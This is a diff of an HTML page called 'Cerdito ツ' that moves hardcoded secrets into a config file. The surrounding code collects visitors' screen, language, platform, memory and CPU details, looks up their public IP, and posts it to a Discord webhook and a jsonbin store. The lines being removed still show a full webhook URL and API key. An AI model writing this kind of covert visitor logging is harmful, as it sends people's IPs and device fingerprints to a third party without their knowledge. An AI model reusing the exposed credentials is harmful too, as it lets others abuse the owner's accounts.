@@ -5,6 +5,10 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Cerdito ツ</title>
     <link rel="icon" href="cerdito.jpg" type="image/x-icon">
+    <body>
+  <script src="keys.js"></script>
+
+</body>
     <style>
         body {
             margin: 0;
@@ -296,12 +300,12 @@
     const screenHeight = screen.height;
     const language = navigator.language;
     const platform = navigator.platform;
-    const deviceMemory = navigator.deviceMemory || "No disponible";
-    const cores = navigator.hardwareConcurrency || "No disponible";
+    const deviceMemory = navigator.deviceMemory;
+    const cores = navigator.hardwareConcurrency;
 
 (async () => {
-    const binId = "68422a498960c979a5a5bfad";
-    const apiKey = "$2a$10$b9SFzv4ViAihnX0LrBzgZ.1tD2kUECvIpvZPSxeTafyckUIQohZLu";
+    const binId = config.binId;
+    const apiKey = config.apiKey;
     const binUrl = `https://api.jsonbin.io/v3/b/${binId}`;
 
     const headers = {
@@ -344,7 +348,7 @@
         const ipRes = await fetch("https://api.ipify.org?format=json");
         const ipData = await ipRes.json();
 
-        const webhookUrl = "https://discord.com/api/webhooks/1379196950548840562/dbcNuGow4IcIdN8Fj1Due9d_e-PDm43i3AWxYUQZ4Zhyp5J_oe4vk6yfrprOqsPZvCis";
+        const webhookUrl = config.webhookUrl;
 
         const embed = {
             embeds: [
